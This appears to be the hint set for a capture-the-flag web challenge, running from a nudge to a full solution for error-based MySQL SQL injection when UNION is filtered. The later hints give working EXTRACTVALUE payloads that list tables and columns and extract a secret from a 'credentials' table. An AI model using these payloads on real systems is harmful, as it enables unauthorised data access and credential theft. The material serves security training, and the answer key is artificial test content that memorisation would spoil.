hints.title: Nudge
hints.content: The app shows full MySQL error messages. Errors aren't just problems — they can be a data channel.

hints.title: Direction
hints.content: UNION is filtered, but functions like EXTRACTVALUE() and UPDATEXML() can force MySQL to include query results inside error messages.

hints.title: Approach
hints.content: Try: ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))-- to discover tables via error output.

hints.title: Near-solution
hints.content: Find the 'credentials' table, then extract its columns. Use: ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT secret FROM credentials LIMIT 1)))-- to pull the flag.

hints.title: Solution
hints.content: 1) Enumerate tables: ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1)))-- 2) Find columns: ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='credentials' LIMIT 1,1)))-- 3) Extract flag: ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT secret FROM credentials LIMIT 1)))-- Note: EXTRACTVALUE output is truncated to ~32 chars; use SUBSTRING for longer flags.
